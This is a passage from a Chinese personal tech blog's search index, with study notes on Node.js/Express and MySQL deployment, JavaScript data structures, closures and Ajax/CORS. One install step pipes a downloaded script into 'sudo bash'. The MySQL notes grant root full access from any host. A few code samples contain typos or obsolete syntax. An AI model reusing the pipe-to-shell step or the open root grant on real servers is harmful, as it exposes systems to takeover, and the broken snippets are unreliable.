/*构建添加用户语句，ID属性为auto_increment*/ var sql = \"insert into user values(\" + \"null,\" + connection.escape(name) + \")\"; //console.log(sql); /*向数据库添加数据*/ connection.query(sql, function(err, rows, fields)&#123; /*返回response*/ res.send(&#123; status: 200, data: rows, err: err, message: \"success\" &#125;) &#125;); connection.end();&#125;)module.exports = router; 数据库连接问题本地连接问题报错client does not support authentication 的解决办法： 12mysql&gt; alter user &apos;用户名&apos;@&apos;localhost&apos; identified with mysql_native_password by &apos;密码&apos;;mysql&gt; flush privileges; 远程连接问题连接服务器数据库，被拒绝服务。 解决办法：Ubuntu设置MySQL允许远程访问，参考：链接 1&gt; sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf 将bind-address = 127.0.0.1注释掉； 给root授予在任意主机（%）访问任意数据库的所有权限 1mysql&gt; grant all privileges on *.* to &apos;root&apos;@&apos;%&apos; identified by &apos;密码&apos; with grant option; 或者把root用户修改成允许远程主机访问 12mysql&gt; update user set host=&apos;%&apos; where user=&apos;root&apos; and host=&apos;localhost&apos;;mysql&gt; flush privileges; 完成后退出并重启mysql 1&gt;sudo service mysql restart 在Ubuntu服务器上配置node环境安装nodejs第一种办法： 123456789sudo apt updatesudo apt install nodejssudo apt install npmsudo apt install nodejs-legacynpm config set registry http://registry.npm.taobao.org/sudo npm install n -gsudo n stable 第二种办法：（安装指定版本） 如安装Node.js v12.x： 123# Using Ubuntucurl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -sudo apt-get install -y nodejs 安装Express并运行12345678sudo npm install express-generator -g#创建web应用程序express express-appcd express-appnpm install#测试并启动DEBUG=myapp:* npm start 可以在服务器的3000端口访问到这个express应用 安装pm212345sudo npm install pm2 -gcd ~/express-app/#使用pm2进程管理器运行express应用pm2 start ./bin/www 如图所示，express应用正在pm2中运行，名称为www，id为0 显示更多信息 1pm2 show www 查看日志 1pm2 logs www 设置开机自启 12pm2 startup systemdsudo env PATH=$PATH:/usr/local/bin /usr/local/lib/node_modules/pm2/bin/pm2 startup systemd -u ubuntu --hp /home/ubuntu 参考：这里是链接","categories":[],"tags":[{"name":"Node.js","slug":"Node-js","permalink":"http://yoursite.com/tags/Node-js/"},{"name":"Express","slug":"Express","permalink":"http://yoursite.com/tags/Express/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"}]},{"title":"JavaScript数据结构与算法学习","slug":"JavaScript数据结构与算法学习","date":"2019-07-05T09:34:30.000Z","updated":"2019-11-22T14:35:07.654Z","comments":true,"path":"2019/07/05/JavaScript数据结构与算法学习/","link":"","permalink":"http://yoursite.com/2019/07/05/JavaScript数据结构与算法学习/","excerpt":"","text":"数组添加、插入元素1234567891011121314var numbers = [0,1,2,3,4,5];//向数组尾部添加number.push(6);number.push(7,8,9); //[0,1,2,3,4,5,6,7,8,9]//插入元素到首位for (var i = numbers.length; i &gt;= 0; i--) &#123; numbers[i] = numbers[i-1];&#125;numbers[0] = -1;//或者用unshift()方法numbers.unshift(-2);numbers.unshift(-5,-4,-3); //[-5,-4,-3,-2,-1,0,1,2,3,4,5,6,7,8,9]//在任意位置添加元素(比如在位置5插入1,2,3)splice(5,0,1,2,3) //因为在这里不删元素，所以第二个参数为零 删除元素12345678910//删除末尾元素numbers.pop();//删除首位元素for (var i = 0; i &lt; numbers.length; i++) &#123; numbers[i] = numbers[i+1];&#125;//或者用shift()方法numbers.shift();//在任意位置删除元素(比如在位置5删除3个元素，即删掉了位置5、6、7上的元素)numbers.splice(5,3); 合并数组1234var zero = 0;var positiveNumbers = [1,2,3];var negativeNumbers = [-1,-2,-3];var numbers = negativeNumbers.concat(zero, positiveNumbers); 数组的迭代器函数12345678910111213141516171819//遍历numbers.forEach(x =&gt; &#123; console.log(x);&#125;);for (let n of numbers) &#123; console.log(n);&#125;//一个判断是否为偶数的函数var isEven = (x) =&gt; &#123; return (x % 2 == 0) ? true : false;&#125;numbers.every(isEven); //false；全部为偶才返回truenumbers.some(isEven); //true；只要存在偶数就返回truenumbers.map(isEven); // [false, true, false, true, false, true, false, true, false, true]；返回结果数组numbers.filter(isEven); //[2, 4, 6, 8, 10]；返回所有符合条件的元素所组成的数组//reduce()会将每次的结果叠加到累加器，执行结束返回累加器的值numbers.reduce(function(prev, curr, index) &#123; //数组求和 return prev + curr;&#125;); 数组排序123456789101112//逆序numbers.reverse();//升序numbers.sort((a,b) =&gt; &#123; if (a &lt; b) &#123; return -1; &#125; if (a &gt; b) &#123; return 1; &#125; return 0;&#125;); 栈 (后进先出LIFO)123456789101112function Stack () &#123; let items = []; //保存栈中的元素 //向栈添加元素 this.push = function(element) &#123; items.push(element); &#125; //从栈移除元素 this.pop = function() &#123; return items.pop(); &#125;&#125; 用ES6的class创建： 123456789class Stack &#123; constructor () &#123; this.items = []; &#125; push(element) &#123; this.items.push(element); &#125; //其他方法与上述写法类似&#125; 例子：用栈实现十进制转二进制的函数 1234567891011121314151617function divideBy2(dec) &#123; var remStack = new Stack(), rem, binaryString = ''; while (dec &gt; 0) &#123; rem = Math.floor(dec % 2); remStack.push(rem); dec = Math.floor(dec / 2); &#125; while (!remStack.isEmpty()) &#123; binaryString += remStack.pop().toString(); &#125; return binaryString;&#125; 队列 (先进先出FIFO)1234567891011121314151617181920212223242526272829function Queue () &#123; let items = []; //向队列添加元素 this.enqueue = function(element) &#123; items.push(element); &#125; //从队列移除元素 this.dequeue = function() &#123; return items.shift(); &#125; //查看队头元素 this.front = function() &#123; return items[0]; &#125; //检查队列是否为空 this.isEmpty = function() &#123; return items.length == 0; &#125; //打印队列元素个数 this.size = function() &#123; return items.length; &#125; //打印队列元素 this.print = function() &#123; console.log(items.toString()); &#125;&#125;let queue = new Queue();queue.enqueue('Nancy'); 优先队列（对应的优先级数字越小优先级越高） 1234567891011121314151617181920212223242526272829function PriorityQueue() &#123; let items = []; function QueueElement (element, priority) &#123; this.element = element; this.priority = priority; &#125; this.enqueue = function(element, priority) &#123; let queueElement = new QueueElement(element, priority); let added = false; for (let i = 0; i &lt; items.length; i++) &#123; if (queueElement.priority &lt; items[i].priority) &#123; items.splice(i,0,queueElement); added = true; break; &#125; &#125; if (!added) &#123; items.push(queueElement); &#125; &#125;; this.print = function() &#123; for (let i = 0; i &lt; items.length; i++) &#123; console.log(`$&#123;items[i].element&#125;,$&#123;items[i].priority&#125;`); &#125; &#125;; //其他方法与普通队列一致&#125; 链表普通链表123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124function LinkedList() &#123; //创建Node类表示链表项 let Node = function(element) &#123; this.element = element; this.next = null; &#125; let length = 0; let head = null; //向链表末尾追加节点 this.append = function(element) &#123; let node = new Node(element), current; if(head == null) &#123; head = node; &#125; else &#123; current = head; while(current.next) &#123; current = current.next; &#125; current.next = node; &#125; length++; &#125;; //删除指定位置的节点 this.removeAt = function(position) &#123; if(position &gt; -1 &amp;&amp; position &lt; length) &#123; let current = head, previous, index = 0; if(position === 0) &#123; head = current.next; &#125; else &#123; while(index++ &lt; position) &#123; previous = current; current = current.next; &#125; previous.next = current.next; &#125; length--; return current.element; &#125; else &#123; return null; &#125; &#125; //在任意位置插入节点 this.insert = function(position, element) &#123; if(position &gt;= 0 &amp;&amp; position &lt;= length) &#123; let node = new Node(element), current = head, previous, index = 0; if(position === 0)&#123; node.next = current; head = node; &#125; else &#123; while(index++ &lt; position) &#123; previous = current; current = current.next; &#125; node.next = current; previous.next = node; &#125; length++; return true; &#125; else &#123; return false; &#125; &#125;; //把LinkedList对象转换成字符串 this.toString = function() &#123; let current = head, string = ''; while(current)&#123; string += current.element + (current.next ? '\\n' : ''); current = current.next; &#125; return string; &#125;; //返回节点对应的索引值 this.indexOf = function(element) &#123; let current = head; index = 0; while(current) &#123; if(current.element === element) &#123; return index; &#125; index++; current = current.next; &#125; return -1; &#125;; //判空 this.isEmpty = function() &#123; return length === 0; &#125;; //获取链表长度 this.size = function() &#123; return length; &#125;; //获取头节点 this.getHead = function() &#123; return head; &#125;&#125; 双向链表123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081function DoublyLinkedList() &#123; let Node = function(element) &#123; this.element = element; this.prev = null; this.next = null; &#125; let length = 0; let head = null; let tail = null; this.insert = function(position, element) &#123; if(position &gt;= 0 &amp;&amp; position &lt;= length) &#123; let node = new Node(element), current = head, previous, index = 0; if(position === 0) &#123; if(!head) &#123; head = node; tail = node; &#125; else &#123; node.next = current; current.prev = node; head = node; &#125; &#125; else if (position === length) &#123; current = tail; current.next = node; node.prev = current; tail = node; &#125; else &#123; while(index++ &lt; position)&#123; previous = current; current = current.next; &#125; node.next = current; node.prev = previous; &#125; length++; return true; &#125; else &#123; return false; &#125; &#125;; this.removeAt = function(position) &#123; if(position &gt; -1 &amp;&amp; position &lt; length)&#123; let current = head, previous, index = 0; if(position === 0) &#123; head = current.next; if(length === 1) &#123; tail = null; &#125; else &#123; head.prev = null; &#125; &#125; else if (position === length-1) &#123; current = tail; tail = current.prev; tail.next = null; &#125; else &#123; while(index++ &lt; position) &#123; previous = current; current = current.next; &#125; previous.next = current.next; current.next.prev = previous; &#125; length--; return current.element; &#125; else &#123; return null; &#125; &#125;;&#125; 循环链表与普通链表的区别在于tail.next不是null而是head。 集合集合由一组无序且唯一的项组成。 创建集合 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120function Set() &#123; let items = &#123;&#125;; this.has = function(value) &#123; return items.hasOwnProperty(value); &#125;; this.add = function(value) &#123; if(!this.has(value))&#123; items[value] = value; return true; &#125; return false; &#125;; this.remove = function(value) &#123; if(this.has(value))&#123; delete items[value]; return true; &#125; return false; &#125;; this.clear = function() &#123; items = &#123;&#125;; &#125;; this.size = function() &#123; return Object.keys(items).length; &#125;; //size()方法的兼容版本 this.sizeLegacy = function() &#123; let count = 0; for(let key in items) &#123; if(items.haOwnProperty(key)) ++count; &#125; return count; &#125; this.values = function() &#123; let values = []; for(let i = 0, keys = Object.keys(items); i&lt;keys.length; i++) &#123; values.push(items[keys[i]]) &#125; return values; &#125; //values()的兼容版本 this.valuesLegacy = function() &#123; let values = []; for(let key in items) &#123; if(items.hasOwnProperty(key)) &#123; values.push(items[key]); &#125; &#125; return values; &#125;; //取并集 this.union = function(otherSet) &#123; let unionSet = new Set(); let values = this.values(); for(let i=0; i&lt;values.length; i++) &#123; unionSet.add(values[i]); &#125; values = otherSet.values(); for(let i=0; i&lt;values.length; i++) &#123; unionSet.add(values[i]); &#125; return unionSet; &#125;; //取交集 this.intersection = function(otherSet) &#123; let intersectionSet = new Set(); let values = this.values(); for(let i=0; i&lt;values.length; i++) &#123; if(otherSet.has(values[i])) &#123; intersectionSet.add(values[i]); &#125; &#125; return intersectionSet; &#125;; //差集 this.difference = function(otherSet) &#123; let differenceSet = new Set(); let values = this.values(); for (let i=0; i&lt;values.length; i++) &#123; if(!otherSet.has(values[i])) &#123; differenceSet.add(values[i]); &#125; &#125; return differenceSet; &#125;; //判断是否是另一个集合的子集 this.subset = function(otherSet) &#123; if(this.size() &gt; otherSet.size()) &#123; return false; &#125; else &#123; let values = this.values(); for (let i=0; i&lt;values.length; i++) &#123; if(!otherSet.has(values[i]))&#123; return false; &#125; &#125; return true; &#125; &#125;; &#125; ES6——Set类 区别：values()方法返回一个Iterator；自身具有size属性；无自带的并集、交集、差集和子集方法，但可以用其他自身方法实现。 并集 123let unionAB = new Set();for (let x of setA) unionAB.add(x);for (let x of setB) unionAB.add(x); 交集 12345678910let intersection = function(setA, setB) &#123; let intersectionSet = new Set(); for (let x of setA) &#123; if(setB.has(x)) &#123; intersectionSet.add(x); &#125; &#125; return intersectionSet;&#125;;let intersectionAB = intersection(setA, setB); 差集 12345678910111213let difference = function(setA, setB) &#123; let differenceSet = new Set(); for (let x of setA) &#123; if (!setB.has(x)) &#123; differenceSet.add(x); &#125; &#125; return differenceSet;&#125;;let differenceAB = difference(setA, setB);//或者用ES6的写法实现differenceAB = new Set([x for (x of setA) if (!setB.has(x))]); 字典和散列表Map和Set 树图","categories":[],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://yoursite.com/tags/Javascript/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://yoursite.com/tags/数据结构与算法/"}]},{"title":"JS之闭包和原型那些事儿","slug":"JS之闭包和原型那些事儿","date":"2019-04-02T14:17:33.000Z","updated":"2019-07-25T07:35:04.093Z","comments":true,"path":"2019/04/02/JS之闭包和原型那些事儿/","link":"","permalink":"http://yoursite.com/2019/04/02/JS之闭包和原型那些事儿/","excerpt":"","text":"Part1：作用域和闭包作用域是什么？我们需要一套设计良好的规则用于存储变量，并且之后可以方便地找到这些变量，这套规则被称为作用域。 JS的编译原理在传统编译语言的流程中，程序的源代码在被执行前会经历三个步骤，统称为“编译”。 分词/词法分析 在这个过程中由字符组成的字符串被分解成有意义的代码块，这些代码块即词法单元。比如var a = 2;会分解成var、a、=、2、；。 解析/语法分析 在这个过程中词法单元流（数组）转换成一个由元素逐级嵌套组成的代表程序语法结构的树，即“抽象语法树（AST）”。 代码生成 将抽象语法树转换成可执行代码。比如将var a = 2;的AST转化为一组机器指令，用来创建a变量（分配内存等），并将2存储在a中。 不过JS引擎相对这种传统的编译器要复杂得多，比如JS引擎在语法分析和代码生成时会对运行性能进行优化，包括对冗余元素的优化等。 对于JS来说，编译大多发生在代码执行前的几微秒甚至更短的时间内。 编译器遇到var a时会询问该作用域中是否已经有同名的变量，如果是编译器会忽略该声明，否则会声明一个新的变量a。接下来编译器会为引擎生成运行时所需的代码用于处理a=2这个赋值操作。引擎运行时会首先询问在当前作用域集合中是否存在一个叫作a的变量，如果存在引擎会把2赋给a，否则引擎继续查找该变量，若仍未找到则抛出异常。 JS引擎的LHS和RHS查询LHS查询是查找变量的容器本身，从而对变量赋值；RHS查询即查找某个变量的值，或者说是取到它的源值。 “寻找赋值操作的目标”=&gt;LHS查询；“获取变量的值”=&gt;RHS查询 在当前作用域中无法找到某个变量时引擎就会在外层嵌套的作用域中继续查找，直到找到该变量或抵达最外层的作用域（全局作用域）为止。 如果RHS查询在所有的嵌套作用域中都找不到所需变量引擎会抛出ReferenceError异常；而引擎在执行LHS查询时如果没有找到目标变量就会在全局作用域中创建一个具有该名称的变量，并将其返还给引擎（在非严格模式下），严格模式下也会报错。 词法作用域词法作用域由变量和块作用域在代码中的位置决定。 有两种欺骗词法的机制：分别是eval()和with关键字的使用。欺骗词法作用域会导致性能下降，所以在代码中尽量不使用。 在执行eval(..)之后的代码时，引擎并不知道eval()内的代码是以动态的形式插入进来并对词法作用域进行修改的。 注意setTimeout(..)和setInterval(..)的第一个参数可以是字符串，字符串的内容会被解释成一段动态生成的函数代码。new Function(..)最后一个参数也可以接受代码字符串，也是类似的，不提倡使用。 with声明实际上是根据传递给它的对象凭空创建了一个全新的词法作用域，并且还会产生意想不到的影响，比如下面的例子。 123456789function foo(obj)&#123; with(obj)&#123; a = 2; &#125;&#125;var obj = &#123; b:3 &#125;foo(obj); //注意obj中没有a变量console.log(obj.a); //undefinedconsole.log(a); //2——a变量被泄露到全局作用域上了 函数作用域把代码片段用函数声明进行封装实际上就是用作用域把这些代码隐藏了，将具体内容私有化，同时可以规避命名冲突。 12function foo()&#123;...&#125; //声明了一个具名函数，但foo这个函数名也会“污染”所在作用域foo(); 解决办法： 1(function foo()&#123;...&#125;)(); //立即执行函数表达式IIFE 1234var a = 2;(function IIFE(obj)&#123; console.log(obj.a);&#125;)(window); //可以传入参数，函数也能传 12345678910//用匿名函数setTimeout(function()&#123; alert('..');&#125;,1000);//匿名函数在栈追踪中不会显示出有意义的函数名，使得调试很困难//若没有函数名，当函数需要调用自身时只能通过过期的arguments.callee引用//可以让匿名函数具名setTimeout(function handler()&#123; alert('..');&#125;,1000); 块级作用域如for循环，with关键字，try/catch…还有各种{…} let关键字可以将变量隐式地附加在一个已经存在的块级作用域上。比如let在for循环中会将变量i重新绑定到循环的每个迭代中。 1234567891011for(let i=0;i&lt;len;i++)&#123; console.log(i);&#125;//等同于&#123; let j; for(j=0;j&lt;len;j++)&#123; let i = j; //每个迭代重新绑定 console.log(i); &#125;&#125; 块级作用域有助于垃圾回收，为变量显式声明作用域并进行本地绑定十分有用。 123456789function process(data)&#123; //...&#125;var bigData = &#123;/*..*/&#125;;process(bigData);btn.addEventListener('click',function click(evt)&#123; //click函数会形成一个覆盖整个作用域的闭包，可能导致bigData不被回收 console.log('clicked');&#125;) 通过添加块级作用域解决 12345678910function process(data)&#123; //...&#125;&#123; let bigData = &#123;/*..*/&#125;; process(bigData);&#125;btn.addEventListener('click',function click(evt)&#123; console.log('clicked');&#125;) 作用域提升无论作用域中的声明出现在什么地方都会在代码本身被执行前首先进行处理，所有的声明（变量和函数）都会被“移动”到各自作用域的顶端。 函数声明和变量声明都会被提升，但是函数声明会优先被提升。 12345678foo(); //1var foo;function foo()&#123; //函数声明会被优先提升 console.log(1);&#125;foo = function()&#123; console.log(2);&#125; 12345678//上面的代码实际是这样function foo()&#123; console.log(1);&#125;foo();foo = function()&#123; console.log(2);&#125; 12345678910foo(); //3function foo()&#123; console.log(1);&#125;var foo = function()&#123; console.log(2);&#125;function foo()&#123; //在后面出现的同名函数声明可以覆盖前面的 console.log(3);&#125; 作用域闭包举个例子解释一下 123456789function foo()&#123; var a = 2; function bar()&#123; console.log(a); &#125; return bar;&#125;var baz = foo();baz(); //2——这就是闭包的效果 bar()可以访问foo()的内部作用域，并将bar()作为返回值。然后将返回值赋给了baz，使得bar()函数在自身的词法作用域之外通过调用baz()被执行；foo()执行后其内部作用域不会被回收，因为bar()仍然在使用foo()的作用域。bar()拥有涵盖foo()内部作用域的闭包，使得该作用域能够一直存活，以供bar()在以后任何时间引用 ，bar()持有的对foo()内部作用域的引用就是闭包。 1234567891011function foo()&#123; var a = 2; function baz()&#123; console.log(a); &#125; bar(baz);&#125;function bar(fn)&#123; fn(); //这里会调用传入的内部函数baz，闭包被使用&#125;foo(); 无论通过何种方式将内部函数传递到所在的词法作用域之外，都会使得它持有对原始作用域的引用，所以无论在何处执行这个函数都会使用闭包。 回调函数实际上也在使用闭包。 循环和闭包12345for(var i=1;i&lt;=5;i++)&#123; setTimeout(function timer()&#123; console.log(i); &#125;,i*1000);&#125; 上面这段代码我们预期会依次输出数字1~5，但实际上会已每秒一次的频率输出五次6。说明输出的是循环结束时的i值，这是因为延迟函数的回调会在循环结束时执行。我们试图假设每次迭代运行时都会给自己捕获一个i的副本，但它们还是被封闭在一个共享的全局作用域中，实际只有一个i。 我们需要在每次迭代中生成一个独有的闭包作用域。 123456789//解决办法一for(var i=1;i&lt;=5;i++)&#123; (function()&#123; var j = i; setTimeout(function timer()&#123; console.log(j); &#125;, j*1000); &#125;)(i);&#125; 1234567//解决办法二for(let i=1;i&lt;=5;i++)&#123; //每次迭代变量i都会被重新声明 //第一次迭代之后的每次迭代都会使用上一个迭代结束的值来初始化变量i setTimeout(function timer()&#123; console.log(i); &#125;,i*1000);&#125; 模块（重点）12345678910111213141516//这是一个模块function module()&#123; var sth1 = 'value'; var sth2 = [1,2,3]; function doSomething()&#123; console.log(sth1); &#125; function doAnother()&#123; console.log(sth2.join(',')); &#125; return &#123; //返回值可以看作模块的公共API doSomething: doSomething, doAnother: doAnother &#125;;&#125;var foo = module(); 模块模式需要具备两个必要条件： 必须有外部的封闭函数，该函数至少被调用一次（每次调用都会创建一个新的模块实例）。 封闭函数必须返回至少一个内部函数，这样内部函数才能在私有作用域中形成闭包，并可以访问或修改私有属性。 现代模块机制： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546var MyModules = (function Manager()&#123; var modules = &#123;&#125;; //模块的内容 function define(name,deps,impl)&#123; //name是我们定义的新模块的名字 //deps是新模块所依赖的模块名字的数组 //impl是个function for(var i=0;i&lt;deps.length;i++)&#123; //将传入的deps数组的每个元素转变为模块的一个引用 deps[i] = modules[deps[i]]; &#125; //通过apply调用impl，将依赖模块的引用作为参数传入新模块的作用域中 modules[name] = impl.apply(impl,deps); &#125; function get(name)&#123; return modules[name]; &#125; return &#123; define: define, get: get &#125;;&#125;)();MyModules.define('bar',[],function()&#123; function hello(who)&#123; return 'hello,' + who; &#125; return &#123; hello: hello &#125;;&#125;);MyModules.define('foo',['bar'],function(bar)&#123; var val = 'happy'; function awesome()&#123; console.log(bar.hello(val).toUpperCase()); &#125; return &#123; awesome: awesome &#125;;&#125;);var bar = MyModules.get('bar');var foo = MyModules.get('foo');console.log( bar.hello('happy'); //hello,happy);foo.awesome(); //HELLO,HAPPY 插播apply()和call()的用法：链接 ES6模块API： 1234567891011121314151617181920212223//bar.jsfunction hello(who)&#123; return 'hello,' + who;&#125;export hello;//foo.jsimport hello from 'bar';var val = 'happy';function awesome()&#123; console.log( hello(val).toUpperCase() );&#125;export awesome;//baz.jsmodule foo from 'foo';module bar from 'bar';console.log( bar.hello('happy'); //hello,happy);foo.awesome(); //HELLO,HAPPY import可以将一个模块中的一个或多个API导入到当前作用域当中，并分别绑定到变量上；module会将整个模块的API导入并绑定到一个变量上。 模块文件中的内容会被当作包含在作用域闭包中一样来处理，就像函数闭包模块一样。","categories":[],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://yoursite.com/tags/Javascript/"}]},{"title":"Ajax学习笔记","slug":"Ajax学习笔记","date":"2019-02-05T14:16:28.000Z","updated":"2019-02-05T14:17:34.701Z","comments":true,"path":"2019/02/05/Ajax学习笔记/","link":"","permalink":"http://yoursite.com/2019/02/05/Ajax学习笔记/","excerpt":"","text":"认识AjaxAjax：Asynchronous Javascript and XML （即异步的javascript和XML），是一种在无需重新加载整个页面的情况下能够更新部分页面的技术。通过在后台跟服务器进行少量的数据交换，网页就可以实现异步局部更新。 运用HTML和CSS实现页面，然后构建XMLHttpRequest对象进行页面与web服务器间的异步数据交换，页面获取到响应信息后运用Javascript操作DOM，实现局部动态更新。 Ajax-XMLHttpRequest对象构建123456var request;if(window.XMLHttpRequest)&#123; request = new XMLHttpRequest(); //IE7+,Firefox,Chrome,Opera,Safari...&#125;else&#123; request = new ActiveXObject(\"Microsoft.XMLHTTP\"); //IE5,IE6&#125; Ajax-HTTP请求HTTP是计算机通过网络进行通信的规则，是一种无状态的协议。 完整的HTTP请求步骤： 建立TCP连接 Web浏览器向Web服务器发送请求命令 浏览器发送请求头信息 服务器应答 服务器发送应答头信息 服务器向浏览器发送数据 服务器关闭TCP连接 GET：一般用于信息获取，使用URL传递参数，发送信息的数量限制在2000个字符内 POST：一般用于修改服务器上的资源，对所发送信息数无限制 HTTP状态码： 1XX：表示接收到浏览器请求，正在处理信息 2XX：成功，用户请求被正确接收、理解和处理 （200 OK） 3XX：重定向，表示请求没有成功，用户必须采取进一步操作 4XX：客户端错误，表示客户端提交的请求有误 5XX：服务器错误，表示服务器不能完成对请求的处理 XHR发送请求 open(method,url,async) send(string) 1234567request.open(\"GET\",\"get.php\",true);request.send();request.open(\"POST\",\"create.php\",true);//设置头信息request.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");request.send(\"name=nancy&amp;age=3\"); XHR取得响应 responseText：获得字符串形式的响应数据 responseXML：获得XML形式的响应数据 status和statusText：以数字和文本形式返回HTTP状态码 getAllResponseHeader()：获取所有的响应报头 getResponseHeader()：查询响应中的某个字段的值 readyState属性 0：请求未初始化，open还未调用 1：服务器连接已建立，open已经调用了 2：请求已接收 3：请求处理中 4：请求已完成，响应已就绪 12345678910111213141516request.onreadystatechange = function()&#123; if(request.readyState === 4)&#123; //判断响应结果 if(request.status === 200)&#123; //成功，通过responseText得到响应文本 return success(request.responseText); &#125;else&#123; //失败，根据响应码判断失败原因 return fail(request.status); &#125; &#125;else&#123; //HTTP请求还在继续... &#125;&#125;request.open('GET','/api/categories');request.send(); JSONJSON：Javascript对象表示法。JSON是存储和交换文本信息的语法，类似XML。它采用键值对的方式组织起来，易于阅读和编写，同时易于机器解析和生成。JSON是独立于语言的，只要符合JSON的规则，无论什么语言都可以解析JSON。 JSON的长度与XML格式相比很短小，读写速度快。JSON可以使用javascrip内建的方法直接进行解析转换成JavaScript对象，十分便捷。 JSON语法规则JSON数据的书写格式：名称/值对 （比如：”name”:”nancy”） JSON的值可以是数字、字符串、逻辑值、数组（在方括号中）、对象（在花括号中）和null。 123456&#123; \"staff\":[ &#123;\"name\":\"nancy\",\"age\":3&#125;, &#123;\"name\":\"pig\",\"age\":2&#125; ]&#125; JSON解析方式12345var jsondata = '&#123;\"staff\":[&#123;\"name\":\"nancy\",\"age\":3&#125;,&#123;\"name\":\"pig\",\"age\":2&#125;]&#125;';//第一种方式用eval不会看JSON数据形式是否合法，直接执行，是不安全的var jsonObj = eval('('+jsondata+')'); //第二种方式用parse函数相对安全var jsonObj2 = JSON.parse(jsondata); 123456789request.onreadystatechange = function()&#123; if(request.readyState === 4)&#123; if(request.status === 200)&#123; var data = JSON.parse(request.responseText); if(data.success)&#123;...&#125; else &#123;...&#125; &#125;else &#123; alert(\"发生错误：\"+request.status); &#125; &#125;&#125; 用JQuery实现Ajax jQuery.ajax([settings]) type：类型，”POST“或”GET“，默认为”GET“ url：发送请求的地址 data：是一个对象，连同请求发送到服务器的数据 dataType：预期服务器返回的数据类型。如果不确定，jQuery将自动根据HTTP包MIME信息智能判断，一般采用JSON格式，可设置为”JSON“ success：是一个方法，请求成功后的回调函数。传入返回后的数据，以及包含成功代码的字符串 error：是一个方法，请求失败时调用此函数。传入XMLHttpRequest对象 例如： 1234567891011121314$(document).ready(function()&#123; $(\"#search\").click(function()&#123; $.ajax(&#123; type: \"GET\", url: \"service.php?number=\"+$(\"#keyword\").val(), dataType: \"json\", success: function(data)&#123; if(data.success)&#123; &#125;else&#123;...&#125; &#125;, error: function(jqXHR)&#123;...&#125; &#125;); &#125;);&#125;); 处理跨域方式当协议、子域名、主域名、端口号中任意一个不同时都算作不同域，不同域之间相互请求资源就算作“跨域”。Javascript出于安全方面的考虑，不允许跨域调用其他页面的对象，即Javascript同源策略的限制。 方法一：创建代理在同域名的服务器上创建代理。比如现在有两个服务器域名分别为www.beijing.com和www.shanghai.com，在北京的服务器后端（www.beijing.com/proxy-shanghaiservice.php）调用上海服务器（www.shanghai.com/service.php）的服务，然后把响应结果返回给前端。 方法二：JSONPJSONP可用于解决主流浏览器的跨域数据访问问题（不支持POST请求）。 123456789//www.aaa.com某网页&lt;script&gt; function jsonp(json)&#123; alert(json['name']); &#125;&lt;/script&gt;&lt;script src=\"http://www.bbb.com/jsonp.js\"&gt;&lt;/script&gt;//www.bbb.com页面中jsonp(&#123;'name':'nancy','age':3&#125;); 123456789101112131415$(document).ready(function()&#123; $(\"#search\").click(function()&#123; $.ajax(&#123; type: \"GET\", url: \"service.php?number=\"+$(\"#keyword\").val(), dataType: \"jsonp\", jsonp: \"callback\", success: function(data)&#123; if(data.success)&#123; &#125;else&#123;...&#125; &#125;, error: function(jqXHR)&#123;...&#125; &#125;); &#125;);&#125;); 方法三：XHR2HTML5提供的XMLHttpRequest Level2已经实现跨域访问和其他新功能（IE10以下版本不支持） 只需在服务器端添加两句话即可： 12header(&apos;Access-Control-Allow-Origin:*&apos;);header(&apos;Access-Control-Allow-Methods:POST,GET&apos;); 方法四：CORSCORS：Cross-Origin Resource Sharing 1234567891011121314151617181920212223242526function createCORSRequest(method, url) &#123; var xhr = new XMLHttpRequest(); if (\"withCredentials\" in xhr) &#123; // \"withCredentials\"属性是XMLHTTPRequest2中独有的 xhr.open(method, url, true); &#125; else if (typeof XDomainRequest != \"undefined\") &#123; // 检测是否XDomainRequest可用 xhr = new XDomainRequest(); xhr.open(method, url); &#125; else &#123; // 看起来CORS根本不被支持 xhr = null; &#125; return xhr;&#125;var xhr = createCORSRequest('GET', url);if (!xhr) &#123; throw new Error('CORS not supported');&#125; 参考：CORS详解","categories":[],"tags":[{"name":"Ajax","slug":"Ajax","permalink":"http://yoursite.com/tags/Ajax/"}]},{"title":"深入学习CSS布局","slug":"深入学习CSS布局","date":"2018-11-12T04:45:16.000Z","updated":"2020-01-17T08:29:22.469Z","comments":true,"path":"2018/11/12/深入学习CSS布局/","link":"","permalink":"http://yoursite.com/2018/11/12/深入学习CSS布局/","excerpt":"","text":"0x00前言CSS是个神奇的东西，可以把一个简陋的网页修饰得十分高大上，同时对于初学者来说很好上手，几天就可以快速入门做出一些网页。但是实际上想把CSS里面的知识学透也不是一件容易的事，因为实现某种效果往往会有多种不同的方式，几个常见的属性结合在一起很有可能会得到意想不到的结果，这里面有很多东西要去考虑，需要多去练习和总结才能做到灵活运用。 0x01涉及到的一些基本属性position 值 描述 absolute 生成绝对定位的元素，相对于 static 定位(unpositioned)以外的第一个父元素进行定位。 元素的位置通过 “left”, “top”, “right” ,”bottom” 属性进行规定。 fixed 生成固定定位的元素，相对于浏览器窗口进行定位。 元素的位置通过 “left”, “top”, “right” , “bottom” 属性进行规定。 relative 生成相对定位的元素，相对于其正常位置进行定位。 因此，”left: 20px” 会向元素的 LEFT 位置添加 20 像素。 static 默认值。没有定位(unpositioned)，元素出现在正常的流中（忽略 top, bottom, left, right 或者 z-index 声明）。 inherit 规定应该从父元素继承 position 属性的值。 sticky 新增属性：粘性定位，该定位基于用户滚动的位置。它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed; 它会固定在目标位置。（Internet Explorer, Edge 15 及更早 IE 版本不支持 sticky 定位。 Safari 需要使用 -webkit-prefix。） 如果绝对定位（position属性的值为absolute）的元素没有“positioned”祖先元素，那么它会相对于文档的 body 